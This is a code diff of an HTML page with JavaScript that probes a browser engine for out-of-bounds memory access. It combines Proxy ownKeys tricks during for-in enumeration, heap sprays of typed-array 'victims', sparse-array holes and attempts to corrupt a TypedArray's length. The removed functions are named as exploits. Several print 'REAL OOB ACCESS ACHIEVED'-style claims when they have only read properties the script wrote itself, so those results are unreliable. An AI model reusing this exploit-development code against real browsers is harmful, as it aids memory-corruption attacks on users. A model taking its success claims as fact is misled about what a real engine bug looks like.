@@ -2,36 +2,30 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Real OOB Access via Stale Enumerator</title>
+    <title>TRUE OOB Test - Compact</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
-        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; max-height: 700px; overflow-y: auto; }
-        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
-        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px; cursor: pointer; font-size: 15px; font-weight: bold; }
-        .log { padding: 4px 0; font-size: 12px; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 10px; font-size: 11px; line-height: 1.3; }
+        h1 { color: #f00; font-size: 18px; margin-bottom: 10px; text-align: center; border-bottom: 2px solid #f00; padding-bottom: 5px; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 8px 0; padding: 10px; height: calc(100vh - 140px); overflow-y: auto; }
+        .btn { padding: 8px 15px; background: #f00; border: none; color: #fff; margin: 3px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .log { padding: 2px 0; font-size: 11px; }
         .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; font-weight: bold; }
         .warn { color: #ff0; font-weight: bold; }
         .info { color: #0ff; }
-        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; margin: 5px 0; }
+        .critical { color: #f0f; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>🎯 REAL OOB Access via Stale Enumerator 🎯</h1>
-    
-    <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="exploit1()">Exploit 1: Array Index OOB</button>
-        <button class="btn" onclick="exploit2()">Exploit 2: Property Name as Index</button>
-        <button class="btn" onclick="exploit3()">Exploit 3: Dynamic Property Access</button>
-        <button class="btn" onclick="exploit4()">Exploit 4: Prototype Property Index</button>
+    <h1>🔬 TRUE OOB TEST 🔬</h1>
+    <div style="text-align: center; margin-bottom: 8px;">
+        <button class="btn" onclick="test1()">Test 1: Phantom Props</button>
+        <button class="btn" onclick="test2()">Test 2: Array Holes</button>
+        <button class="btn" onclick="test3()">Test 3: Victim Spray</button>
+        <button class="btn" onclick="test4()">Test 4: TypedArray</button>
     </div>
-    
-    <div class="section">
-        <div class="title">📋 Exploit Results</div>
-        <div id="log"></div>
-    </div>
+    <div class="section"><div id="log"></div></div>
 
 <script>
 function log(msg, type) {
@@ -41,522 +35,273 @@ function log(msg, type) {
     document.getElementById('log').appendChild(div);
 }
 
-function sep() {
-    log('═'.repeat(80), 'info');
-}
-
 function hex(val) {
-    if (typeof val === 'number') {
-        return '0x' + val.toString(16);
-    }
-    return String(val);
+    return typeof val === 'number' ? '0x' + val.toString(16) : String(val);
 }
 
-// ============================================
-// EXPLOIT 1: ARRAY INDEX OOB
-// ============================================
-function exploit1() {
+function test1() {
     document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 1: True OOB via Array Property Names', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Use numeric property names to access array indices OOB', 'info');
+    log('═══ TEST 1: Phantom Properties (No Write) ═══', 'critical');
     log('', '');
     
     try {
-        // Create victim array adjacent to our target
-        log('[1] Creating victim array...', 'info');
-        var victim = new Uint32Array(0x100);
-        for (var i = 0; i < victim.length; i++) {
-            victim[i] = 0xDEADBEEF;
-        }
-        log('  ✓ Victim created with marker 0xDEADBEEF', 'success');
-        log('', '');
-        
-        // Create object with numeric properties that will be confused as array indices
-        log('[2] Creating confusion object with numeric properties...', 'info');
-        
+        log('[1] Creating object with ONLY [0-49]...', 'info');
         var target = {};
+        for (var i = 0; i < 50; i++) target[i] = 0xAAAA0000 + i;
+        log('✓ Created 50 properties, [50-199] DO NOT EXIST', 'success');
         
-        // Add properties 0-50
-        for (var i = 0; i < 50; i++) {
-            target[i] = 0x11110000 + i;
+        log('[2] Creating victims...', 'info');
+        var victims = [];
+        for (var i = 0; i < 100; i++) {
+            var v = new Uint32Array(4);
+            v[0] = 0xDEAD0000 + i;
+            victims.push(v);
         }
+        log('✓ Created 100 victims', 'success');
         
-        log('  ✓ Added properties [0] through [49]', 'success');
-        log('', '');
-        
-        // Create proxy that adds MORE numeric properties during enumeration
-        log('[3] Creating OOB-inducing proxy...', 'info');
-        
-        var expanded = false;
+        log('[3] Creating phantom proxy...', 'info');
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                if (!expanded) {
-                    expanded = true;
-                    log('  [!] Expanding to properties [50] through [199]!', 'warn');
-                    
-                    // Add properties 50-199 DURING enumeration
-                    for (var i = 50; i < 200; i++) {
-                        t[i] = 0x22220000 + i;
-                    }
-                    
-                    // Also store victim at various indices
-                    t[100] = victim;
-                    t[150] = victim;
-                    
-                    log('  [!] Enumerator thinks we have 50 properties', 'critical');
-                    log('  [!] But we actually have 200 properties!', 'critical');
-                }
-                return Reflect.ownKeys(t);
+                log('  [!] Claiming [0-199] exist but NOT writing [50-199]!', 'critical');
+                var keys = [];
+                for (var i = 0; i < 200; i++) keys.push(String(i));
+                return keys;
+            },
+            has: function(t, prop) {
+                var idx = parseInt(prop);
+                return !isNaN(idx) && idx >= 0 && idx < 200;
             }
         });
+        log('✓ Phantom proxy created', 'success');
         
-        log('  ✓ OOB proxy created', 'success');
-        log('', '');
-        
-        // Enumerate and try to access beyond original size
-        log('[4] Enumerating and accessing...', 'info');
-        
-        var accessed = [];
-        var oobAccess = [];
-        
-        for (var key in proxy) {
-            accessed.push(key);
-            
-            // Try to detect if we're accessing beyond expected range
-            var idx = parseInt(key);
-            if (!isNaN(idx) && idx >= 50) {
-                var val = proxy[key];
-                oobAccess.push({idx: idx, val: val});
-                
-                if (oobAccess.length <= 5) {
-                    log('  [!] Accessed [' + idx + '] = ' + hex(val), 'critical');
-                }
-            }
-        }
+        log('[4] Enumerating...', 'info');
+        var count = 0;
+        for (var key in proxy) count++;
+        log('✓ Enumerated ' + count + ' properties', 'success');
         
         log('', '');
-        log('[5] Results:', 'info');
-        log('  Total properties enumerated: ' + accessed.length, 'success');
-        log('  Properties beyond index 50: ' + oobAccess.length, oobAccess.length > 0 ? 'critical' : 'warn');
-        
-        if (oobAccess.length > 0) {
-            log('', '');
-            log('✓✓✓ ACCESSED BEYOND EXPECTED SIZE! ✓✓✓', 'critical');
-            log('  Enumerator expected 50, accessed ' + accessed.length + '!', 'critical');
-        }
-        
-        // Now try DIRECT INDEX ACCESS to see if we can read OOB
-        log('', '');
-        log('[6] Testing DIRECT index access...', 'info');
-        
-        // Try to access indices that shouldn't exist based on original size
-        var directOOB = [];
+        log('[5] CRITICAL: Reading phantom [50-59] that we NEVER wrote...', 'critical');
+        var found = [];
         for (var i = 50; i < 60; i++) {
             var val = target[i];
             if (val !== undefined) {
-                directOOB.push({idx: i, val: val});
-                log('  target[' + i + '] = ' + hex(val), 'critical');
-            }
-        }
-        
-        if (directOOB.length > 0) {
-            log('', '');
-            log('✓✓✓ DIRECT OOB ACCESS WORKS! ✓✓✓', 'critical');
-        }
-        
-    } catch(e) {
-        log('', '');
-        log('ERROR: ' + e.message, 'fail');
-    }
-    
-    sep();
-}
-
-// ============================================
-// EXPLOIT 2: PROPERTY NAME AS INDEX
-// ============================================
-function exploit2() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 2: Use Stale Property Count for OOB', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Access properties by index derived from stale count', 'info');
-    log('', '');
-    
-    try {
-        log('[1] Creating array-like object...', 'info');
-        
-        var obj = {};
-        var props = [];
-        
-        // Create initial properties
-        for (var i = 0; i < 30; i++) {
-            var propName = 'prop_' + i;
-            obj[propName] = 0x33330000 + i;
-            props.push(propName);
-        }
-        
-        log('  ✓ Created 30 properties', 'success');
-        log('', '');
-        
-        // Create victims to detect OOB
-        log('[2] Creating victim objects...', 'info');
-        var victims = [];
-        for (var i = 0; i < 100; i++) {
-            victims.push({
-                marker: 0x44440000 + i,
-                data: 'victim_' + i
-            });
-        }
-        log('  ✓ Created 100 victims', 'success');
-        log('', '');
-        
-        // Proxy that expands AND adds victims
-        log('[3] Creating expansion proxy...', 'info');
-        
-        var proxy = new Proxy(obj, {
-            ownKeys: function(t) {
-                log('  [!] Massive expansion!', 'warn');
-                
-                // Add 70 more properties (30 → 100)
-                for (var i = 30; i < 100; i++) {
-                    t['prop_' + i] = 0x33330000 + i;
-                    t['victim_' + i] = victims[i];
-                }
-                
-                log('  [!] Expanded from 30 to 100 properties!', 'critical');
-                
-                return Reflect.ownKeys(t);
-            }
-        });
-        
-        log('  ✓ Expansion proxy created', 'success');
-        log('', '');
-        
-        // Collect property names during enumeration
-        log('[4] Enumerating...', 'info');
-        
-        var enumerated = [];
-        for (var key in proxy) {
-            enumerated.push(key);
-        }
-        
-        log('  ✓ Enumerated ' + enumerated.length + ' properties', 'success');
-        log('', '');
-        
-        // Try to access using enumerated names
-        log('[5] Accessing via enumerated names...', 'info');
-        
-        var foundVictims = 0;
-        for (var i = 0; i < enumerated.length; i++) {
-            var key = enumerated[i];
-            if (key.indexOf('victim_') === 0) {
-                var val = obj[key];
-                if (val && val.marker) {
-                    foundVictims++;
-                    if (foundVictims <= 5) {
-                        log('  [!] Found victim: ' + key + ', marker: ' + hex(val.marker), 'critical');
+                found.push({i: i, val: val});
+                if (found.length <= 5) {
+                    if (typeof val === 'number') {
+                        log('  [!] target[' + i + '] = ' + hex(val) + ' ← NEVER WROTE THIS!', 'critical');
+                    } else {
+                        log('  [!] target[' + i + '] = ' + val.constructor.name, 'critical');
                     }
                 }
             }
         }
         
         log('', '');
-        if (foundVictims > 0) {
-            log('✓✓✓ ACCESSED ' + foundVictims + ' VICTIMS VIA ENUMERATION! ✓✓✓', 'critical');
+        log('═══ RESULTS ═══', 'info');
+        log('Claimed: 200 | Actually wrote: 50 | Found data: ' + found.length, 'info');
+        
+        if (found.length > 0) {
+            log('', '');
+            log('🎉🎉🎉 TRUE OOB CONFIRMED! 🎉🎉🎉', 'critical');
+            log('We read memory we NEVER wrote!', 'critical');
+        } else {
+            log('', '');
+            log('❌ No OOB - all phantoms returned undefined', 'fail');
         }
+    } catch(e) {
+        log('ERROR: ' + e.message, 'fail');
+    }
+}
+
+function test2() {
+    document.getElementById('log').innerHTML = '';
+    log('═══ TEST 2: Array Holes ═══', 'critical');
+    log('', '');
+    
+    try {
+        log('[1] Creating sparse array...', 'info');
+        var arr = [];
+        arr[0] = 0xBBBB0000;
+        arr[10] = 0xBBBB000A;
+        arr[20] = 0xBBBB0014;
+        log('✓ Holes at: [1-9], [11-19], [21-29], [31+]', 'success');
         
-        // Check if we can access properties that were added during enumeration
+        log('[2] Spraying victims...', 'info');
+        var victims = [];
+        for (var i = 0; i < 500; i++) {
+            victims.push(new Uint32Array([0xCCCC0000 + i, 0xDDDD0000 + i]));
+        }
+        log('✓ Sprayed 500 victims', 'success');
+        
+        log('[3] Creating hole proxy...', 'info');
+        var proxy = new Proxy(arr, {
+            ownKeys: function(t) {
+                log('  [!] Claiming [0-100] exist', 'warn');
+                var keys = ['length'];
+                for (var i = 0; i < 100; i++) keys.push(String(i));
+                return keys;
+            }
+        });
+        log('✓ Proxy created', 'success');
+        
+        log('[4] Enumerating...', 'info');
+        for (var key in proxy) {}
+        log('✓ Done', 'success');
+        
         log('', '');
-        log('[6] Testing which properties are accessible...', 'info');
-        
-        var accessible = 0;
-        for (var i = 30; i < 100; i++) {
-            var key = 'prop_' + i;
-            var val = obj[key];
+        log('[5] Reading holes...', 'critical');
+        var holeData = [];
+        var testIdx = [1, 2, 3, 11, 12, 21, 22, 31, 32, 40, 50];
+        for (var i = 0; i < testIdx.length; i++) {
+            var idx = testIdx[i];
+            var val = arr[idx];
             if (val !== undefined) {
-                accessible++;
+                holeData.push({i: idx, val: val});
+                log('  [!] arr[' + idx + '] = ' + hex(val), 'critical');
             }
         }
         
-        log('  Properties 30-99 accessible: ' + accessible + ' / 70', accessible > 0 ? 'critical' : 'warn');
-        
-    } catch(e) {
         log('', '');
+        if (holeData.length > 0) {
+            log('✓✓✓ FOUND ' + holeData.length + ' DATA IN HOLES! ✓✓✓', 'critical');
+        } else {
+            log('❌ All holes = undefined', 'warn');
+        }
+    } catch(e) {
         log('ERROR: ' + e.message, 'fail');
     }
-    
-    sep();
 }
 
-// ============================================
-// EXPLOIT 3: DYNAMIC PROPERTY ACCESS
-// ============================================
-function exploit3() {
+function test3() {
     document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 3: Dynamic Property Access During Enumeration', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Access properties dynamically as they are added', 'info');
+    log('═══ TEST 3: Adjacent Victim Spray ═══', 'critical');
     log('', '');
     
     try {
-        log('[1] Creating dynamic access object...', 'info');
-        
-        var base = {
-            data: new Uint32Array(0x100)
-        };
-        
-        // Fill data with markers
-        for (var i = 0; i < base.data.length; i++) {
-            base.data[i] = 0x55550000 + i;
+        log('[1] Pre-spray 500 victims...', 'info');
+        var pre = [];
+        for (var i = 0; i < 500; i++) {
+            var v = new Uint32Array(4);
+            v[0] = 0xEEEE0000 + i;
+            pre.push(v);
         }
+        log('✓ Done', 'success');
         
-        log('  ✓ Base object with Uint32Array created', 'success');
-        log('', '');
+        log('[2] Create target with 20 props...', 'info');
+        var target = {};
+        for (var i = 0; i < 20; i++) target['p' + i] = i;
+        log('✓ Done', 'success');
         
-        // Create prototype chain
-        log('[2] Creating prototype chain...', 'info');
-        
-        var proto = {
-            arr0: new Uint32Array([0xAAAA0000, 0xAAAA0001, 0xAAAA0002])
-        };
-        
-        Object.setPrototypeOf(base, proto);
-        
-        log('  ✓ Prototype chain created', 'success');
-        log('', '');
-        
-        // Proxy that adds arrays during enumeration
-        log('[3] Creating dynamic expansion proxy...', 'info');
-        
-        var accessLog = [];
-        
-        var proxy = new Proxy(base, {
-            ownKeys: function(t) {
-                log('  [!] Adding arrays during enumeration!', 'warn');
-                
-                // Add more arrays
-                for (var i = 1; i < 50; i++) {
-                    var arr = new Uint32Array(10);
-                    for (var j = 0; j < arr.length; j++) {
-                        arr[j] = 0x66660000 + (i * 0x100) + j;
-                    }
-                    t['arr' + i] = arr;
-                    proto['parr' + i] = arr;
-                }
-                
-                log('  [!] Added 50 arrays to target + 50 to proto!', 'critical');
-                
-                return Reflect.ownKeys(t);
-            },
-            get: function(t, prop) {
-                accessLog.push(prop);
-                return t[prop] || proto[prop];
-            }
-        });
-        
-        log('  ✓ Dynamic proxy created', 'success');
-        log('', '');
-        
-        // Enumerate and access
-        log('[4] Enumerating...', 'info');
-        
-        var arraysAccessed = 0;
-        for (var key in proxy) {
-            var val = proxy[key];
-            if (val && val.constructor === Uint32Array) {
-                arraysAccessed++;
-                if (arraysAccessed <= 5) {
-                    log('  Accessed ' + key + ', first value: ' + hex(val[0]), 'info');
-                }
-            }
+        log('[3] Post-spray 500 victims...', 'info');
+        var post = [];
+        for (var i = 0; i < 500; i++) {
+            var v = new Uint32Array(4);
+            v[0] = 0x33330000 + i;
+            post.push(v);
         }
+        log('✓ Done', 'success');
         
-        log('', '');
-        log('  Total arrays accessed: ' + arraysAccessed, 'success');
-        log('  Total property accesses logged: ' + accessLog.length, 'success');
-        
-        // Check if we accessed arrays that were added during enumeration
-        log('', '');
-        log('[5] Analyzing accessed arrays...', 'info');
-        
-        var dynamicAccess = 0;
-        for (var i = 0; i < accessLog.length; i++) {
-            var prop = accessLog[i];
-            if (prop.indexOf('arr') === 0) {
-                var arrNum = parseInt(prop.substring(3));
-                if (!isNaN(arrNum) && arrNum >= 1) {
-                    dynamicAccess++;
-                }
-            }
-        }
-        
-        log('  Arrays added during enumeration that were accessed: ' + dynamicAccess, dynamicAccess > 0 ? 'critical' : 'warn');
-        
-        if (dynamicAccess > 0) {
-            log('', '');
-            log('✓✓✓ DYNAMICALLY ADDED ARRAYS WERE ACCESSED! ✓✓✓', 'critical');
-        }
-        
-    } catch(e) {
-        log('', '');
-        log('ERROR: ' + e.message, 'fail');
-    }
-    
-    sep();
-}
-
-// ============================================
-// EXPLOIT 4: PROTOTYPE PROPERTY INDEX
-// ============================================
-function exploit4() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('EXPLOIT 4: Prototype Property Indexing OOB', 'critical');
-    sep();
-    log('', '');
-    
-    log('[*] Strategy: Use prototype chain expansion to access beyond bounds', 'info');
-    log('', '');
-    
-    try {
-        log('[1] Creating indexed prototype chain...', 'info');
-        
-        // Create prototype with numeric indices
-        var proto = {};
-        for (var i = 0; i < 20; i++) {
-            proto[i] = 0x77770000 + i;
-        }
-        
-        var target = Object.create(proto);
-        for (var i = 0; i < 20; i++) {
-            target[i] = 0x88880000 + i;
-        }
-        
-        log('  ✓ Created target[0-19] and proto[0-19]', 'success');
-        log('', '');
-        
-        // Add victim arrays at high indices
-        log('[2] Creating victims at high indices...', 'info');
-        
-        var victims = [];
-        for (var i = 0; i < 50; i++) {
-            var v = new Uint32Array(0x10);
-            v[0] = 0x99990000 + i;
-            victims.push(v);
-        }
-        
-        log('  ✓ Created 50 victim arrays', 'success');
-        log('', '');
-        
-        // Proxy that expands numeric indices
-        log('[3] Creating index expansion proxy...', 'info');
-        
+        log('[4] Creating massive phantom proxy...', 'info');
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                log('  [!] Expanding numeric indices!', 'warn');
-                
-                // Add indices 20-100 to target
-                for (var i = 20; i < 100; i++) {
-                    t[i] = 0x88880000 + i;
+                log('  [!] Claiming 1000 properties!', 'critical');
+                var keys = [];
+                for (var i = 0; i < 1000; i++) keys.push('phantom_' + i);
+                return keys;
+            }
+        });
+        log('✓ Done', 'success');
+        
+        log('[5] Enumerating...', 'info');
+        for (var key in proxy) {}
+        log('✓ Done', 'success');
+        
+        log('', '');
+        log('[6] Reading phantoms [20-40]...', 'critical');
+        var found = [];
+        for (var i = 20; i < 40; i++) {
+            var val = target['phantom_' + i];
+            if (val !== undefined) {
+                found.push(i);
+                if (found.length <= 5) {
+                    log('  [!] phantom_' + i + ' = ' + (typeof val === 'number' ? hex(val) : val.constructor.name), 'critical');
                 }
-                
-                // Add victims at certain indices
-                for (var i = 0; i < victims.length; i++) {
-                    var idx = 50 + i;
-                    t[idx] = victims[i];
-                }
-                
-                // Expand proto too
-                for (var i = 20; i < 150; i++) {
-                    proto[i] = 0x77770000 + i;
-                }
-                
-                log('  [!] target now has indices 0-99', 'critical');
-                log('  [!] proto now has indices 0-149', 'critical');
-                log('  [!] Enumerator thinks we have 40 total', 'critical');
-                
+            }
+        }
+        
+        log('', '');
+        if (found.length > 0) {
+            log('✓✓✓ FOUND ' + found.length + ' ADJACENT DATA! ✓✓✓', 'critical');
+        } else {
+            log('❌ No adjacent data', 'warn');
+        }
+    } catch(e) {
+        log('ERROR: ' + e.message, 'fail');
+    }
+}
+
+function test4() {
+    document.getElementById('log').innerHTML = '';
+    log('═══ TEST 4: TypedArray Length Corruption ═══', 'critical');
+    log('', '');
+    
+    try {
+        log('[1] Creating container...', 'info');
+        var container = {arr: new Uint32Array(0x10)};
+        container.arr[0] = 0x12345678;
+        log('✓ arr.length = ' + hex(container.arr.length), 'success');
+        
+        log('[2] Attempting length redefine...', 'info');
+        try {
+            Object.defineProperty(container.arr, 'length', {value: 0x10000});
+            log('✓ Redefined to: ' + hex(container.arr.length), container.arr.length > 0x10 ? 'critical' : 'warn');
+        } catch(e) {
+            log('! Failed: ' + e.message, 'warn');
+        }
+        
+        log('[3] Creating mutation proxy...', 'info');
+        var proxy = new Proxy(container, {
+            ownKeys: function(t) {
+                log('  [!] Attempting corruption...', 'warn');
+                try { t.arr.length = 0x10000; } catch(e) {}
+                try { Object.defineProperty(t.arr, 'length', {value: 0x10000}); } catch(e) {}
+                t.arr2 = new Uint32Array(0x10000);
+                t.arr2[0] = 0xDEADBEEF;
                 return Reflect.ownKeys(t);
             }
         });
+        log('✓ Done', 'success');
         
-        log('  ✓ Index expansion proxy created', 'success');
+        log('[4] Triggering...', 'info');
+        for (var key in proxy) {}
+        log('✓ Done', 'success');
+        
         log('', '');
+        log('[5] Checking state...', 'info');
+        log('arr.length = ' + hex(container.arr.length), 'info');
         
-        // Enumerate
-        log('[4] Enumerating indices...', 'info');
-        
-        var enumerated = [];
-        var highIndices = 0;
-        
-        for (var key in proxy) {
-            enumerated.push(key);
-            var idx = parseInt(key);
-            if (!isNaN(idx) && idx >= 20) {
-                highIndices++;
-                if (highIndices <= 5) {
-                    var val = proxy[key];
-                    log('  Accessed [' + idx + '] = ' + (typeof val === 'object' ? val.constructor.name : hex(val)), 'info');
+        if (container.arr.length > 0x10) {
+            log('', '');
+            log('✓✓✓ LENGTH CORRUPTED! ✓✓✓', 'critical');
+            log('Attempting OOB read...', 'info');
+            for (var i = 0x10; i < 0x18; i++) {
+                var val = container.arr[i];
+                if (val !== undefined && val !== 0) {
+                    log('  arr[' + hex(i) + '] = ' + hex(val), 'critical');
                 }
             }
+        } else {
+            log('! Length unchanged', 'warn');
         }
         
-        log('', '');
-        log('  Total enumerated: ' + enumerated.length, 'success');
-        log('  Indices >= 20: ' + highIndices, 'success');
-        
-        // Try direct access to indices beyond original size
-        log('', '');
-        log('[5] Testing direct index access...', 'info');
-        
-        var victimsFound = 0;
-        for (var i = 50; i < 100; i++) {
-            var val = target[i];
-            if (val && val.constructor === Uint32Array) {
-                victimsFound++;
-                if (victimsFound <= 3) {
-                    log('  [!] Found victim at target[' + i + '], value: ' + hex(val[0]), 'critical');
-                }
-            }
+        if (container.arr2) {
+            log('arr2.length = ' + hex(container.arr2.length), 'success');
+            log('arr2[0] = ' + hex(container.arr2[0]), 'success');
         }
-        
-        log('', '');
-        if (victimsFound > 0) {
-            log('✓✓✓ FOUND ' + victimsFound + ' VICTIMS AT HIGH INDICES! ✓✓✓', 'critical');
-        }
-        
-        // Test if we can use this for actual OOB
-        log('', '');
-        log('[6] Testing for REAL OOB access...', 'info');
-        
-        // Try to access index that should be way OOB
-        for (var i = 100; i < 110; i++) {
-            var val = target[i];
-            if (val !== undefined) {
-                log('  [!] target[' + i + '] = ' + hex(val), 'critical');
-                log('', '');
-                log('✓✓✓ REAL OOB ACCESS ACHIEVED! ✓✓✓', 'critical');
-                break;
-            }
-        }
-        
     } catch(e) {
-        log('', '');
         log('ERROR: ' + e.message, 'fail');
     }
-    
-    sep();
 }
-
 </script>
 </body>
 </html>
